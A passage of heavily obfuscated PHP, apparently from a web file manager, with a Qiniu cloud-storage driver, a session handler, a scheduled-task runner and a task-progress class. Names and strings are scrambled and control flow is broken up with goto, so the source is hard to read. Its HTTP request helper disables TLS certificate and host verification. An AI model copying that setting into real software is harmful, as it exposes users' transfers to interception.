return !1; } goto b²Óé‡×í˜; Cî®âÀŠ„Ê: $eÕÆê¶ºî =& $_SERVER[¿õñ]; $bĞ°™ÀÄº‰ = array(); if (is_array($EÜ†¤õá³é)) { foreach ($EÜ†¤õá³é as $B‚×º×ÑĞ£) { $bĞ°™ÀÄº‰[] = $this->link($B‚×º×ÑĞ£); } } else { $bĞ°™ÀÄº‰[] = $this->link($EÜ†¤õá³é); } goto AĞÀ† ó§Û; D‹ÌÉš¿“‰: } public function fileSubstr($A£ùĞÒÌ›ô, $fŞŞ˜òß¤õ, $d ‚ÉİÎÕÎ) { $c«á¯³ìê =& $_SERVER[¿õñ]; if (!($B¶¹ğ‘Ù†§ = $this->link($A£ùĞÒÌ›ô))) { return !1; } $CÖ—ÒÅ”¢ç = array($c«á¯³ìê[1155] => $fŞŞ˜òß¤õ, $c«á¯³ìê[322] => $d ‚ÉİÎÕÎ); return $this->qnRequest($B¶¹ğ‘Ù†§, $CÖ—ÒÅ”¢ç); } public function upload($Fï˜•õä, $CŞŸ½çƒÂ, $DïË¬»§ñ— = false, $D³­æÛÁàà = REPEAT_REPLACE) { $aÊÉ™ÄƒØÔ = new Qiniu\Storage\UploadManager(); $bß½äÏŞòÏ = $this->auth->uploadToken($this->bucket, $Fï˜•õä); $B¯‹—˜Î ³ = get_file_mime(get_path_ext($CŞŸ½çƒÂ)); list($e‘õ÷®ÕØ¬, $B¹¤­¤ï±Ô) = $aÊÉ™ÄƒØÔ->putFile($bß½äÏŞòÏ, $Fï˜•õä, $CŞŸ½çƒÂ, null, $B¯‹—˜Î ³); return $B¹¤­¤ï±Ô ? !1 : $this->getPathOuter($Fï˜•õä); } public function uploadFormData($Eç„äÌÄ‡, $a¨¾èîèÔÑ = 3600) { return $this->uploadToken($Eç„äÌÄ‡, $a¨¾èîèÔÑ); } public function multiUploadFormData($AŞàº”ò‘, $f‚ó¦Ş¯Ëí = 3600) { return $this->uploadToken($AŞàº”ò‘, $f‚ó¦Ş¯Ëí); } private function uploadToken($FÈŒŒìé¼½, $FçóîÃ‚÷ø = 3600) { goto aÃíŠÒ“; e„ôœÛˆœ: $DÇŠ¶…Ñ±İ = null; $eó¾©·™à‘ = $this->auth->uploadToken($this->bucket, $DÇŠ¶…Ñ±İ, $EÌøÚÈ‘ïé, $cä¸……¯«•, !0); $FÔæÛÇ÷ö = empty($this->region) || $this->region == $eŞ†ëß³Ÿë[1191] ? $eŞ†ëß³Ÿë[33] : $eŞ†ëß³Ÿë[408] . $this->region; goto FôÏ‚¼ïŞ˜; aÃíŠÒ“: $eŞ†ëß³Ÿë =& $_SERVER[¿õñ]; $EÌøÚÈ‘ïé = $FçóîÃ‚÷ø; $cä¸……¯«• = array($eŞ†ëß³Ÿë[1189] => $eŞ†ëß³Ÿë[1190]); goto e„ôœÛˆœ; FôÏ‚¼ïŞ˜: $BßË¬†±Ä = http_type() . "\72\x2f\x2f\x75\x70\x6c\157\141\144{$FÔæÛÇ÷ö}\56\x71\151\x6e\151\165\160\x2e\143\157\x6d\57"; return array($eŞ†ëß³Ÿë[1192] => $eó¾©·™à‘, $eŞ†ëß³Ÿë[1193] => $BßË¬†±Ä); goto CÂíåÁ¹ó; CÂíåÁ¹ó: } public function download($eµâ‘ˆœ£, $DÁˆÍ…ÄöÄ) { goto dé§Å’õŸô; dé§Å’õŸô: $eˆÍ–Çíê =& $_SERVER[¿õñ]; $f÷Ü¡á™¬ = IO::getPathInner(IO::mkfile($DÁˆÍ…ÄöÄ)); if (!($fÜÏ´õ§í = $this->link($eµâ‘ˆœ£))) { return !1; } goto CŸˆîÖ·ª½; CŸˆîÖ·ª½: $Aö¾÷‰Øäã = 0; $Dœ½Œ²¶°ç = 1024 * 200; $A£ËõŸ¼¬± = fopen($f÷Ü¡á™¬, $eˆÍ–Çíê[1194]); goto D›É©Ï¢¸á; D›É©Ï¢¸á: while (!0) { $dÊÊªƒ­Š = array($eˆÍ–Çíê[1155] => $Aö¾÷‰Øäã, $eˆÍ–Çíê[322] => $Dœ½Œ²¶°ç); $Bİ•ƒËê«Ê = $this->qnRequest($fÜÏ´õ§í, $dÊÊªƒ­Š); if ($Aö¾÷‰Øäã && ($Eñ·õËÈÏ = @json_decode($Bİ•ƒËê«Ê, !0))) { if (isset($Eñ·õËÈÏ[$eˆÍ–Çíê[1188]])) { return !1; } } fwrite($A£ËõŸ¼¬±, $Bİ•ƒËê«Ê); $Aö¾÷‰Øäã += $Dœ½Œ²¶°ç; if (strlen($Bİ•ƒËê«Ê) < $Dœ½Œ²¶°ç) { break; } } fclose($A£ËõŸ¼¬±); return $DÁˆÍ…ÄöÄ; goto b±Ìë„’¿È; b±Ìë„’¿È: } public function link($d´ÍŞÄÆİ£, $dŒÍ²—Šƒˆ = '') { if (!$this->isFile($d´ÍŞÄÆİ£)) { return !1; } $fËÈÁ½°˜‹ = $this->getHost() . $_SERVER[¿õñ][8] . $this->pathEncode($d´ÍŞÄÆİ£) . $dŒÍ²—Šƒˆ; return $this->auth->privateDownloadUrl($fËÈÁ½°˜‹, 3600 * 12); } public function fileOut($bóÏ°Ñá›Ç, $fÀÓ•×ùµ = false, $BíÁ ó— = false, $CĞƒ¨¹‰…ƒ = '') { $f‰µÍªÒÄ =& $_SERVER[¿õñ]; if (!$BíÁ ó—) { $BíÁ ó— = $this->pathThis($bóÏ°Ñá›Ç); } $dÇ·î³…Ú = $fÀÓ•×ùµ ? $f‰µÍªÒÄ[1195] . rawurlencode($BíÁ ó—) : $f‰µÍªÒÄ[33]; $AµÁ°—ÔÙ‹ = $this->link($bóÏ°Ñá›Ç, $dÇ·î³…Ú); $this->fileOutLink($AµÁ°—ÔÙ‹); } public function fileOutServer($e„…†Û±¶ã, $dòìƒÄ‹ëï = false, $Fé’î ŸÇï = false, $D‚âÃˆ¾Ÿ = '') { parent::fileOut($e„…†Û±¶ã, $dòìƒÄ‹ëï, $Fé’î ŸÇï, $D‚âÃˆ¾Ÿ); } public function fileOutImage($aêšší¬Ù¢, $A÷Œ¿§±…‰ = 250) { $A¸â‚Œ £• = $this->link($aêšší¬Ù¢, $_SERVER[¿õñ][1196] . $A÷Œ¿§±…‰); $this->fileOutLink($A¸â‚Œ £•); } public function fileOutImageServer($A†³ä¶œ, $E½ïø³ó“Ü = 250) { parent::fileOutImage($A†³ä¶œ, $E½ïø³ó“Ü); } public function fileOutLink($Fğåö÷ÈŒË) { header($_SERVER[¿õñ][153] . $Fğåö÷ÈŒË); die; } public function hashMd5($F¸ÙÈ…Œ¼Ÿ) { $DÁíœ‹Ì =& $_SERVER[¿õñ]; $f“ÄíÈ·ŒØ = $this->objectMeta($F¸ÙÈ…Œ¼Ÿ); if (isset($f“ÄíÈ·ŒØ[$DÁíœ‹Ì[193]])) { return $f“ÄíÈ·ŒØ[$DÁíœ‹Ì[193]]; } $E‡ˆƒõÉ²¬ = $this->link($F¸ÙÈ…Œ¼Ÿ, $DÁíœ‹Ì[1197]); $bÎ½à¤¢© = $this->qnRequest($E‡ˆƒõÉ²¬, array(), !0); return !isset($bÎ½à¤¢©[$DÁíœ‹Ì[194]]) ? !1 : $bÎ½à¤¢©[$DÁíœ‹Ì[194]]; } public function qnRequest($FÎìí¡‹ˆµ, $B¢ÂÚÉî›ã = array(), $aÚì¢‘İ˜ = false) { goto bÃ×í·Ç†; dÌÒÚÔëå: curl_setopt($DÆ´‚å¼à¬, CURLOPT_RETURNTRANSFER, 1); curl_setopt($DÆ´‚å¼à¬, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($DÆ´‚å¼à¬, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto bµ¨ÒÚáœ¨; b‘Ôµ¿Ñ‚: curl_close($DÆ´‚å¼à¬); if ($aÚì¢‘İ˜) { return @json_decode($F…Ó‡Œæó, !0); } return $F…Ó‡Œæó; goto FÍ»³‘ƒ½–; bµ¨ÒÚáœ¨: curl_setopt($DÆ´‚å¼à¬, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($DÆ´‚å¼à¬, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($DÆ´‚å¼à¬, CURLOPT_NOPROGRESS, !1); goto eÑê×Öí§; cô•ôÖ¼ÒÃ: curl_setopt($DÆ´‚å¼à¬, CURLOPT_FOLLOWLOCATION, 1); $F…Ó‡Œæó = curl_exec($DÆ´‚å¼à¬); curl_progress_end($DÆ´‚å¼à¬); goto b‘Ôµ¿Ñ‚; eÑê×Öí§: curl_setopt($DÆ´‚å¼à¬, CURLOPT_PROGRESSFUNCTION, $b„¦£ò…­[1198]); curl_progress_start($DÆ´‚å¼à¬); if (isset($B¢ÂÚÉî›ã[$b„¦£ò…­[1155]]) && $B¢ÂÚÉî›ã[$b„¦£ò…­[322]] > 0) { $dµ‘‚ä‡— = $B¢ÂÚÉî›ã[$b„¦£ò…­[1155]]; $A±²­‹ = $B¢ÂÚÉî›ã[$b„¦£ò…­[1155]] + ($B¢ÂÚÉî›ã[$b„¦£ò…­[322]] - 1); curl_setopt($DÆ´‚å¼à¬, CURLOPT_RANGE, "{$dµ‘‚ä‡—}\x2d{$A±²­‹}"); } goto cô•ôÖ¼ÒÃ; bÃ×í·Ç†: $b„¦£ò…­ =& $_SERVER[¿õñ]; $DÆ´‚å¼à¬ = curl_init(); curl_setopt($DÆ´‚å¼à¬, CURLOPT_URL, $FÎìí¡‹ˆµ); goto dÌÒÚÔëå; FÍ»³‘ƒ½–: } public function size($Aã¯Œ”‡Öç) { $a³±Ö…ÔË = $this->objectMeta($Aã¯Œ”‡Öç); return $a³±Ö…ÔË ? $a³±Ö…ÔË[$_SERVER[¿õñ][78]] : 0; } public function info($aÛğ…Õ‡È‚) { if ($this->isFolder($aÛğ…Õ‡È‚)) { return $this->folderInfo($aÛğ…Õ‡È‚); } else { if ($this->isFile($aÛğ…Õ‡È‚)) { return $this->fileInfo($aÛğ…Õ‡È‚); } } return !1; } public function exist($aµÃŠ‰½Ëã) { return $this->isFile($aµÃŠ‰½Ëã) || $this->isFolder($aµÃŠ‰½Ëã); } public function isFile($a²Ú©×“‘ù) { return !$this->isFolder($a²Ú©×“‘ù) && $this->objectMeta($a²Ú©×“‘ù); } public function isFolder($bƒï²ë ‘’) { return $this->cacheMehod($_SERVER[¿õñ][220], $bƒï²ë ‘’); } protected function objectMeta($C¦§Š¾½ÆÊ) { return $this->cacheMehod($_SERVER[¿õñ][221], $C¦§Š¾½ÆÊ); } protected function _objectMeta($B¹İŞÈ§ŒÉ) { $f±à±°…¸ =& $_SERVER[¿õñ]; list($bŒØÄÎÖ•è, $B‚—áâ) = $this->bucketManager->stat($this->bucket, $B¹İŞÈ§ŒÉ); if ($bŒØÄÎÖ•è) { $bŒØÄÎÖ•è[$f±à±°…¸[78]] = intval($bŒØÄÎÖ•è[$f±à±°…¸[1185]]); } return $bŒØÄÎÖ•è; } protected function _isFolder($eæ¹…†…ÇÙ) { $E¯¿è˜’Ûî =& $_SERVER[¿õñ]; list($e¹ÅÌ¯ßÁù, $C¹½Œ“–¾) = $this->bucketManager->listFiles($this->bucket, trim($eæ¹…†…ÇÙ, $E¯¿è˜’Ûî[8]) . $E¯¿è˜’Ûî[8], $E¯¿è˜’Ûî[33], 1, $E¯¿è˜’Ûî[8]); return !empty($e¹ÅÌ¯ßÁù[$E¯¿è˜’Ûî[1184]]) || !empty($e¹ÅÌ¯ßÁù[$E¯¿è˜’Ûî[1187]]) ? !0 : !1; } } $EãÄŒ«–¬ = LIB_DIR . $_SERVER[¿õñ][778]; goto fŠ•àóÊÖ§; E÷‡İŠä«Ş: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto D•Œñğá³; bĞ½Àõ‡İù: $Aêì¹´å£Ó = new self(); return $Aêì¹´å£Ó; goto D¨±«Îõİ; bˆà¨ØÓŸ”: $BÊ ª¦Œ¬ = $GLOBALS[$Dèêô†­¹‡[6]][$Dèêô†­¹‡[334]]; self::$sessionTime = $BÊ ª¦Œ¬[$Dèêô†­¹‡[1312]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto Bë—Ü¤ÌâÄ; a¯‚ÑÔÅÇŒ: $D‘ô–¶Ååà = $BÊ ª¦Œ¬[$Dèêô†­¹‡[761]]; switch ($Bß‹Ñ¯Öó») { case $Dèêô†­¹‡[17]: self::$handle = Model($Dèêô†­¹‡[762]); break; case $Dèêô†­¹‡[763]: self::$handle = new CacheRedis($b¡­½”¼Ş, $D‘ô–¶Ååà); break; case $Dèêô†­¹‡[764]: self::$handle = new CacheMemcached($b¡­½”¼Ş, $D‘ô–¶Ååà); break; case $Dèêô†­¹‡[164]: $b¡­½”¼Ş[$Dèêô†­¹‡[76]] = $b¡­½”¼Ş[$Dèêô†­¹‡[76]] . $Dèêô†­¹‡[1314]; self::$handle = new CacheFile($b¡­½”¼Ş, $D‘ô–¶Ååà); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto bĞ½Àõ‡İù; D•Œñğá³: $Dèêô†­¹‡ =& $_SERVER[¿õñ]; static $Aêì¹´å£Ó = false; if ($Aêì¹´å£Ó) { return $Aêì¹´å£Ó; } goto bˆà¨ØÓŸ”; Bë—Ü¤ÌâÄ: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $Bß‹Ñ¯Öó» = $BÊ ª¦Œ¬[$Dèêô†­¹‡[1313]]; $b¡­½”¼Ş = $BÊ ª¦Œ¬[$Bß‹Ñ¯Öó»]; goto a¯‚ÑÔÅÇŒ; D¨±«Îõİ: } public static function sign($Dƒ–Œš²¢Š = false) { $Dƒ–Œš²¢Š && (self::$sessionSign = $Dƒ–Œš²¢Š); self::init(); return self::$sessionSign; } public static function set($eß×°òŒ·ô, $Cˆ­Ğ­†À = false) { self::init(); if (is_array($eß×°òŒ·ô)) { foreach ($eß×°òŒ·ô as $d‘ÜÎ°¼¥ => $c¤©Ñ…½œ) { array_set_value(self::$data, $d‘ÜÎ°¼¥, $c¤©Ñ…½œ); } } else { array_set_value(self::$data, $eß×°òŒ·ô, $Cˆ­Ğ­†À); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($eì½¯ê°Öï = false) { self::init(); if (!$eì½¯ê°Öï) { return self::$data; } return array_get_value(self::$data, $eì½¯ê°Öï); } public static function remove($fèØ­Ñ¿³) { self::init(); unset(self::$data[$fèØ­Ñ¿³]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¿õñ][766])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto a®ØÊ¥¹„¢; a®ØÊ¥¹„¢: $Có°¯Ÿ¼Ë =& $_SERVER[¿õñ]; if (self::valueGet($Có°¯Ÿ¼Ë[686]) != $Có°¯Ÿ¼Ë[493]) { return; } if (self::valueGet($Có°¯Ÿ¼Ë[1315]) == $Có°¯Ÿ¼Ë[493]) { $FâÁ¼äÊÛ‚ = self::valueGet($Có°¯Ÿ¼Ë[1316]); if (time() - $FâÁ¼äÊÛ‚ > 3600 * 2) { self::restart(); } return; } goto cÒù©µ¯¬; E»š²êˆÇ±: while (!0) { self::cacheClear(); if (self::valueGet($Có°¯Ÿ¼Ë[686]) != $Có°¯Ÿ¼Ë[493]) { self::valueSet($Có°¯Ÿ¼Ë[1315], $Có°¯Ÿ¼Ë[464]); self::log($Có°¯Ÿ¼Ë[1319]); die; } self::valueSet($Có°¯Ÿ¼Ë[1315], $Có°¯Ÿ¼Ë[493]); self::valueSet($Có°¯Ÿ¼Ë[1316], time()); self::taskRunAll(); sleep(self::valueGet($Có°¯Ÿ¼Ë[1320])); } goto B·ˆöÒ¢…õ; cÒù©µ¯¬: http_close(); self::valueSet($Có°¯Ÿ¼Ë[1315], $Có°¯Ÿ¼Ë[493]); Hook::bind($Có°¯Ÿ¼Ë[1317], $Có°¯Ÿ¼Ë[1318]); goto E»š²êˆÇ±; B·ˆöÒ¢…õ: } public static function restart() { $E®‘“„»ÒÚ =& $_SERVER[¿õñ]; http_close(); self::valueSet($E®‘“„»ÒÚ[686], $E®‘“„»ÒÚ[464]); sleep(self::valueGet($E®‘“„»ÒÚ[1320]) + 5); self::valueSet($E®‘“„»ÒÚ[1315], $E®‘“„»ÒÚ[464]); self::valueSet($E®‘“„»ÒÚ[686], $E®‘“„»ÒÚ[493]); } public static function shutdownEvent() { $c¦§À£é° =& $_SERVER[¿õñ]; self::valueSet($c¦§À£é°[1315], $c¦§À£é°[464]); self::log($c¦§À£é°[1321]); } public static function config($c•¥ˆÇÙ‚, $aÖÅï®ÛôÙ) { $F“Û¶•»  =& $_SERVER[¿õñ]; $aµ¶¢åĞì = 20; $aÖÅï®ÛôÙ = intval($aÖÅï®ÛôÙ) <= $aµ¶¢åĞì ? $aµ¶¢åĞì : intval($aÖÅï®ÛôÙ); self::valueSet($F“Û¶•» [686], $c•¥ˆÇÙ‚); self::valueSet($F“Û¶•» [1320], $aÖÅï®ÛôÙ); } private static function taskRunAll() { $d¹à—Ã£·Ê =& $_SERVER[¿õñ]; $e¢…Ê„ºé§ = Model($d¹à—Ã£·Ê[1322])->listData(); $B¸‹ ùŒ¨ = count($e¢…Ê„ºé§); for ($EîÊíİ™¡ = 0; $EîÊíİ™¡ < $B¸‹ ùŒ¨; $EîÊíİ™¡++) { $Aàˆß®°èç = $e¢…Ê„ºé§[$EîÊíİ™¡]; if ($Aàˆß®°èç[$d¹à—Ã£·Ê[1323]] != $d¹à—Ã£·Ê[493]) { continue; } if (!self::taskTimeCheck($Aàˆß®°èç)) { continue; } self::taskRun($Aàˆß®°èç); } } private static function taskTimeCheck($aÂµÎÌñÅ¢) { goto e¯éš·¤Æ; Cƒ‡Ø¡×…Ğ: switch ($A¯”êéïå§[$dˆŸÜÀÚ[29]]) { case $dˆŸÜÀÚ[1330]: if (time() - $BâÑĞ×Æˆ < 3600 * 24 * 30) { return !1; } if ($A¯”êéïå§[$dˆŸÜÀÚ[1330]] == date($dˆŸÜÀÚ[1331]) && $BïáÎ‚ì) { return !0; } break; case $dˆŸÜÀÚ[1332]: if (time() - $BâÑĞ×Æˆ < 3600 * 24 * 7) { return !1; } $aç„â÷ƒçÙ = date($dˆŸÜÀÚ[1333]) == 0 ? 7 : date($dˆŸÜÀÚ[1333]); if ($A¯”êéïå§[$dˆŸÜÀÚ[1332]] == $aç„â÷ƒçÙ && $BïáÎ‚ì) { return !0; } break; case $dˆŸÜÀÚ[1325]: if (time() - $BâÑĞ×Æˆ < 3600 * 24) { return !1; } if ($BïáÎ‚ì) { return !0; } break; case $dˆŸÜÀÚ[1334]: if (time() - $BâÑĞ×Æˆ >= floatval($A¯”êéïå§[$dˆŸÜÀÚ[1334]]) * 60) { return !0; } break; default: break; } return !1; goto fñ¹èÄ›Ğ; bÓ„¥¨óãâ: $bé·Ä”â‹ = strtotime($dˆŸÜÀÚ[1324] . $A¯”êéïå§[$dˆŸÜÀÚ[1325]] . $dˆŸÜÀÚ[1326]) - strtotime($dˆŸÜÀÚ[1327]); $E¨¸Û‡Ğ½Ò = time() - strtotime(date($dˆŸÜÀÚ[1328]) . $dˆŸÜÀÚ[1329]); $BïáÎ‚ì = $E¨¸Û‡Ğ½Ò >= $bé·Ä”â‹ && $E¨¸Û‡Ğ½Ò <= $bé·Ä”â‹ + 3600; goto Cƒ‡Ø¡×…Ğ; e¯éš·¤Æ: $dˆŸÜÀÚ =& $_SERVER[¿õñ]; $A¯”êéïå§ = json_decode($aÂµÎÌñÅ¢[$dˆŸÜÀÚ[187]], !0); $BâÑĞ×Æˆ = intval($aÂµÎÌñÅ¢[$dˆŸÜÀÚ[1316]]); goto bÓ„¥¨óãâ; fñ¹èÄ›Ğ: } public static function taskRun($cÆÙáÆË†‡) { goto CŠ‡À§Ã‘; C˜Ÿàè¡“: $C¸‚ì‚ƒ¹Ñ = timeFloat(); $AßèİÆĞÙ = $CÒŸÃÆ´Ú[33]; switch ($cÆÙáÆË†‡[$CÒŸÃÆ´Ú[29]]) { case $CÒŸÃÆ´Ú[292]: $EİåŠï¨ˆ = url_request($cÆÙáÆË†‡[$CÒŸÃÆ´Ú[1338]], $CÒŸÃÆ´Ú[213], !1, !1, !1, !1, 5); $AßèİÆĞÙ = strlen($EİåŠï¨ˆ); break; case $CÒŸÃÆ´Ú[212]: $AßèİÆĞÙ = Hook::apply($cÆÙáÆË†‡[$CÒŸÃÆ´Ú[1338]]); default: break; } goto DÔ†Â›–ƒ­; CŠ‡À§Ã‘: $CÒŸÃÆ´Ú =& $_SERVER[¿õñ]; self::log($CÒŸÃÆ´Ú[1335] . $cÆÙáÆË†‡[$CÒŸÃÆ´Ú[364]] . $CÒŸÃÆ´Ú[1336] . $cÆÙáÆË†‡[$CÒŸÃÆ´Ú[28]] . $CÒŸÃÆ´Ú[1337] . $cÆÙáÆË†‡[$CÒŸÃÆ´Ú[1338]]); Model($CÒŸÃÆ´Ú[1322])->run($cÆÙáÆË†‡[$CÒŸÃÆ´Ú[364]]); goto C˜Ÿàè¡“; DÔ†Â›–ƒ­: Model($CÒŸÃÆ´Ú[1339])->add(array($CÒŸÃÆ´Ú[1340] => $CÒŸÃÆ´Ú[33], $CÒŸÃÆ´Ú[1341] => $CÒŸÃÆ´Ú[464], $CÒŸÃÆ´Ú[29] => $CÒŸÃÆ´Ú[1342] . $cÆÙáÆË†‡[$CÒŸÃÆ´Ú[364]], $CÒŸÃÆ´Ú[1343] => json_encode(array($CÒŸÃÆ´Ú[28] => $cÆÙáÆË†‡[$CÒŸÃÆ´Ú[28]], $CÒŸÃÆ´Ú[1344] => timeFloat() - $C¸‚ì‚ƒ¹Ñ, $CÒŸÃÆ´Ú[278] => $AßèİÆĞÙ)))); self::log($CÒŸÃÆ´Ú[1345] . $cÆÙáÆË†‡[$CÒŸÃÆ´Ú[364]] . $CÒŸÃÆ´Ú[1346] . $AßèİÆĞÙ); return !0; goto c¹“éøŠÉ‘; c¹“éøŠÉ‘: } private static function valueGet($f‘†Š¡à£Ë) { $A«õ½®˜µ½ =& $_SERVER[¿õñ]; $B•îÄÀ´‹Ÿ = $A«õ½®˜µ½[1347]; $DÉ­ˆˆåÍ = Model($A«õ½®˜µ½[1348])->get($f‘†Š¡à£Ë, $B•îÄÀ´‹Ÿ); if (is_null($DÉ­ˆˆåÍ)) { Model($A«õ½®˜µ½[1348])->set($A«õ½®˜µ½[1320], 10, $B•îÄÀ´‹Ÿ); Model($A«õ½®˜µ½[1348])->set($A«õ½®˜µ½[686], $A«õ½®˜µ½[493], $B•îÄÀ´‹Ÿ); Model($A«õ½®˜µ½[1348])->set($A«õ½®˜µ½[1315], $A«õ½®˜µ½[464], $B•îÄÀ´‹Ÿ); $DÉ­ˆˆåÍ = Model($A«õ½®˜µ½[1348])->get($f‘†Š¡à£Ë, $B•îÄÀ´‹Ÿ); } return $DÉ­ˆˆåÍ; } private static function valueSet($a§¶›áœ˜, $fŠ°âèğÌ) { $C—æ‘µ¹ÜŞ =& $_SERVER[¿õñ]; return Model($C—æ‘µ¹ÜŞ[1348])->set($a§¶›áœ˜, $fŠ°âèğÌ, $C—æ‘µ¹ÜŞ[1347]); } protected static function log($eš¨ã×¹©…) { write_log($eš¨ã×¹©…, $_SERVER[¿õñ][1349]); } private static function cacheClear() { $Aœ»›’³ƒ =& $_SERVER[¿õñ]; $A¸Ïõ¦“’º = Model($Aœ»›’³ƒ[1348])->cacheKey($Aœ»›’³ƒ[1347]); Cache::clearMemory($A¸Ïõ¦“’º); } } class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($dïÃ¬®óÔ°, $A³à¸…„° = '', $C¢ß¯òÏˆ— = 0, $cÕ¶¦áµï¾ = '') { goto A–šÂŠ‰°ì; A–šÂŠ‰°ì: $cèß İğš =& $_SERVER[¿õñ]; if (self::get($dïÃ¬®óÔ°)) { return; } $this->task = array($cèß İğš[364] => $dïÃ¬®óÔ°, $cèß İğš[1350] => USER_ID, $cèß İğš[1247] => $cÕ¶¦áµï¾, $cèß İğš[29] => $A³à¸…„°, $cèß İğš[1295] => $cèß İğš[33], $cèß İğš[1293] => $C¢ß¯òÏˆ—, $cèß İğš[1298] => 0, $cèß İğš[1351] => 0, $cèß İğš[1352] => 0, $cèß İğš[1353] => timeFloat(), $cèß İğš[1354] => 0, $cèß İğš[1355] => 0, $cèß İğš[1356] => 0, $cèß İğš[1357] => 0, $cèß İğš[686] => $cèß İğš[1315]); goto Bš•òó¹Ğ; FôÖÌ†­˜‹: Hook::trigger($cèß İğš[1361], $this->task); $this->task[$cèß İğš[1355]] = timeFloat(); self::valueSet($this->task[$cèß İğš[364]], $this->task); goto bÄµàì š¡; Bš•òó¹Ğ: Hook::bind($cèß İğš[1317], array($this, $cèß İğš[1358])); Hook::bind($cèß İğš[1359], array($this, $cèß İğš[1360])); $this->startAfter(); goto FôÖÌ†­˜‹; bÄµàì š¡: } public function end() { goto e¦´¹ˆâƒ; Bç“øóôÒˆ: $Cä™æí° = timeFloat() - $this->task[$A‹ñ×š—ÜÊ[1353]]; self::log($A‹ñ×š—ÜÊ[1362] . $this->task[$A‹ñ×š—ÜÊ[364]] . $A‹ñ×š—ÜÊ[1363] . $Cä™æí° . $A‹ñ×š—ÜÊ[1364]); Hook::unbind($A‹ñ×š—ÜÊ[1317], array($this, $A‹ñ×š—ÜÊ[1358])); goto D†¯ŠÚí; e¦´¹ˆâƒ: $A‹ñ×š—ÜÊ =& $_SERVER[¿õñ]; if (!$this->task) { return; } if ($this->task[$A‹ñ×š—ÜÊ[1355]]) { self::valueSet($this->task[$A‹ñ×š—ÜÊ[364]], !1); } goto Bç“øóôÒˆ; D†¯ŠÚí: Hook::unbind($A‹ñ×š—ÜÊ[1359], array($this, $A‹ñ×š—ÜÊ[1360])); $this->endAfter(); $this->task = !1; goto bĞœ¾ÂŞ; bĞœ¾ÂŞ: } public function update($C°×àÛÚ‡Œ = 0) { goto Bƒ¬–ïˆ«İ; fçàã¦†: Hook::trigger($AÇ‹èï¡„†[1368], $a±˜™á°¿õ); self::valueSet($a±˜™á°¿õ[$AÇ‹èï¡„†[364]], $a±˜™á°¿õ); goto bº»ºëŠÌƒ; Bƒ¬–ïˆ«İ: $AÇ‹èï¡„† =& $_SERVER[¿õñ]; $a±˜™á°¿õ =& $this->task; if (!$a±˜™á°¿õ) { return; } goto A¨ù“ÚŞòÏ; B¯÷ã‘‰»‘: $this->updateAfter(); $Câğé¦„³â = 0.2; if (timeFloat() - $a±˜™á°¿õ[$AÇ‹èï¡„†[1355]] < $Câğé¦„³â) { return; } goto e…ÔÓŸäá…; A¨ù“ÚŞòÏ: $a±˜™á°¿õ[$AÇ‹èï¡„†[1298]] += $C°×àÛÚ‡Œ; $a±˜™á°¿õ[$AÇ‹èï¡„†[1354]] = timeFloat(); if ($a±˜™á°¿õ[$AÇ‹èï¡„†[1293]]) { if ($a±˜™á°¿õ[$AÇ‹èï¡„†[1293]] < $a±˜™á°¿õ[$AÇ‹èï¡„†[1298]]) { $a±˜™á°¿õ[$AÇ‹èï¡„†[1293]] = $a±˜™á°¿õ[$AÇ‹èï¡„†[1298]]; } $FŒŞ¢Â = timeFloat() - $a±˜™á°¿õ[$AÇ‹èï¡„†[1353]] - $a±˜™á°¿õ[$AÇ‹èï¡„†[1356]]; $a±˜™á°¿õ[$AÇ‹èï¡„†[1351]] = $a±˜™á°¿õ[$AÇ‹èï¡„†[1298]] / $a±˜™á°¿õ[$AÇ‹èï¡„†[1293]]; $a±˜™á°¿õ[$AÇ‹èï¡„†[1352]] = $a±˜™á°¿õ[$AÇ‹èï¡„†[1298]] / $FŒŞ¢Â; if ($a±˜™á°¿õ[$AÇ‹èï¡„†[1351]] > 0) { $a±˜™á°¿õ[$AÇ‹èï¡„†[1357]] = $FŒŞ¢Â * (1 - $a±˜™á°¿õ[$AÇ‹èï¡„†[1351]]) / $a±˜™á°¿õ[$AÇ‹èï¡„†[1351]]; } $a±˜™á°¿õ[$AÇ‹èï¡„†[1357]] = $a±˜™á°¿õ[$AÇ‹èï¡„†[1357]] <= 0 ? 0 : $a±˜™á°¿õ[$AÇ‹èï¡„†[1357]]; } goto B¯÷ã‘‰»‘; e…ÔÓŸäá…: $d”­¤îŞ¯ = self::get($a±˜™á°¿õ[$AÇ‹èï¡„†[364]]); $d×‹ªŞÖ¯« = $d”­¤îŞ¯[$AÇ‹èï¡„†[686]]; if ($d×‹ªŞÖ¯« == self::STATYS_KILL) { $Dù´„ëåë = array($AÇ‹èï¡„†[1365] => LNG($AÇ‹èï¡„†[1366]), $AÇ‹èï¡„†[1017] => !1); Cache::set($AÇ‹èï¡„†[1367] . $this->task[$AÇ‹èï¡„†[364]], $Dù´„ëåë, 30); $this->end(); die; } else { if ($d×‹ªŞÖ¯« == self::STATYS_STOP) { $a¢«‡ù«…í = 2; $d”­¤îŞ¯[$AÇ‹èï¡„†[1356]] += $a¢«‡ù«…í; self::valueSet($a±˜™á°¿õ[$AÇ‹èï¡„†[364]], $d”­¤îŞ¯); 